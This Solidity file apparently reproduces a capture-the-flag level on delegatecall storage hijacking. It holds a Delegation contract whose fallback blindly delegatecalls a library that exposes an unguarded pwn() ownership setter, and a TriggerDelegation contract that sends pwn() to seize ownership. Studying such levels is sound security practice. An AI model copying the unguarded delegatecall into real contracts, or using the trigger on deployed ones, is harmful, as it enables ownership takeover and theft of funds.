// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "hardhat/console.sol";

contract Delegate {

  address public owner;

  constructor() {
    owner = msg.sender;
  }
//   constructor(address _owner) {
//     owner = _owner;
//   }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    console.log('inside fallback() function');
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract TriggerDelegation {

    constructor() {
    }

    function safeDelegate(address _instanceContractAddress) external returns (bool) {
        // bytes memory callFunction = abi.encodeWithSignature('pwn()', '');
        bytes memory data = abi.encodeWithSignature('pwn()', '');
        (bool success, ) = address(_instanceContractAddress).call(data);

        return success;
    }

}
